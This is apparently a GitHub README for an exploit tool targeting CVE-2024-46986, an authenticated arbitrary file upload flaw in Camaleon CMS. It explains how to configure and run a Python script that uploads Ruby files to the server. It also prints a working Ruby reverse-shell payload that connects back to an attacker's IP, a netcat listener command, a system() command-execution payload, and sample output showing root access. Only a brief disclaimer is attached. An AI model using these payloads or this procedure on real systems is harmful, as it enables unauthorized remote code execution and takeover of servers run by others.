# CVE-2024-46986

# Camaleon CMS Exploit - Arbitrary File Upload

This repository contains a Python script that automates the exploitation of a file upload vulnerability in Camaleon CMS. The vulnerability allows an attacker to upload arbitrary files (such as Ruby scripts) to the server, potentially leading to remote code execution (RCE) or other severe security impacts.

## Features
- **File Upload Exploit**: Uploads malicious Ruby scripts to the target server.
- **Payload Options**: Choose between a reverse shell payload and a command execution payload.
- **Repeated Command Execution**: For the command execution payload, the script allows the user to repeatedly enter commands.
- **Automation**: Automates the entire process using Python's `requests` library.

## Pre-requisites
- **Valid User Credentials**: An authenticated session is required for the exploit to work. You need the `auth_token` and `_cms_session` of a valid user.
- **Python 3.x**: Ensure you have Python 3.x installed.
- **Python `requests` library**: Install the `requests` library if not already installed.
  
  ```bash
  pip install requests

## Usage

    Clone the repository:

    bash

https://github.com/vidura2/CVE-2024-46986.git
cd CVE-2024-46986

## Modify the script:

    Replace the placeholders your_auth_token_here, your_session_token_here, and https://target_site_here in the Python script with actual values.
    If using the reverse shell payload, also replace your_ip and your_port with your IP address and the port on which you will set up a listener.

## Choose the payload type:

    Reverse Shell: To upload a reverse shell, set the payload_type variable in the script to "reverse_shell".
    Command Execution: To upload a script that executes system commands, set payload_type to "command_execution". You will be able to repeatedly enter commands to execute on the target server.

## Run the exploit:

bash

python exploit_camaleon.py

If using the command execution payload, you can enter multiple commands:

bash

    Enter a system command to execute (or type 'exit' to quit): whoami
    Enter a system command to execute (or type 'exit' to quit): ls
    Enter a system command to execute (or type 'exit' to quit): exit

Payload Types
  1. Reverse Shell

The reverse shell payload connects back to the attacker's machine, allowing remote code execution on the server.

    Modify the IP and port in the Ruby script inside the Python code.

    Example payload:

    ruby

require 'socket'
s = TCPSocket.open('your_ip', your_port)
while (cmd = s.gets)
  IO.popen(cmd, 'r') do |io|
    s.print io.read
  end
end

Set up a listener on your machine using netcat:

bash

    nc -lvnp <your_port>

  2. Command Execution

This payload uploads a Ruby script that executes system commands (e.g., whoami) on the server. You can repeatedly enter commands during execution.

    The script will keep asking for commands until you type exit.
    Example:

    ruby

    system("whoami")

Example of Successful Exploit

Once the exploit is successfully executed, you should see output in the terminal indicating success:

python

Exploit executed successfully with payload type: reverse_shell!

If you use the reverse shell, the netcat listener should give you access to the compromised server's shell.

For the command execution payload:

bash

Enter a system command to execute (or type 'exit' to quit): whoami
Command 'whoami' executed successfully!
Response: root

## Disclaimer

This script is intended for educational purposes only. The author is not responsible for any misuse or damage caused by this exploit. Always ensure you have permission before testing or exploiting vulnerabilities.
Contributing

Feel free to submit issues or pull requests for improvements or additional features!
## License

This project is licensed under the MIT License - see the LICENSE file for details.
